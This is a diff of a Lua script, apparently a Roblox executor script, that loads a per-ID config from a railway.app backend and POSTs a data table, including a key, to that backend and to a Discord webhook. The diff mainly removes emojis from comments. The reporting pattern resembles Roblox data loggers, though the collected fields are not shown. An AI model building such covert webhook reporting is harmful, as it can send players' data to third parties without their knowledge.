@@ -7,7 +7,7 @@ end
 
 local HttpService = game:GetService("HttpService")
 
--- 🔧 Universal request function
+-- Universal request function
 local function send_request(options)
     if http_request then
         return http_request(options)
@@ -18,7 +18,7 @@ local function send_request(options)
     end
 end
 
--- 📥 Get user config
+-- Get user config
 local configUrl = "https://element.up.railway.app/api/config?id=" .. ID
 local response = game:HttpGet(configUrl)
 
@@ -37,7 +37,7 @@ if success and config.webhook then
         ["key"] = config.key
     }
 
-    -- 📤 Report to backend
+    -- Report to backend
     send_request({
         Url = "https://element.up.railway.app/report",
         Method = "POST",
@@ -45,13 +45,15 @@ if success and config.webhook then
         Body = HttpService:JSONEncode(data)
     })
 
-    -- 📤 Send also to Discord webhook
+    -- Send also to Discord webhook
     send_request({
         Url = config.webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(data)
     })
+
+    print("[Element] ✅ Data sent successfully")
 else
     warn("⚠️ Config not found for ID: " .. ID)
 end
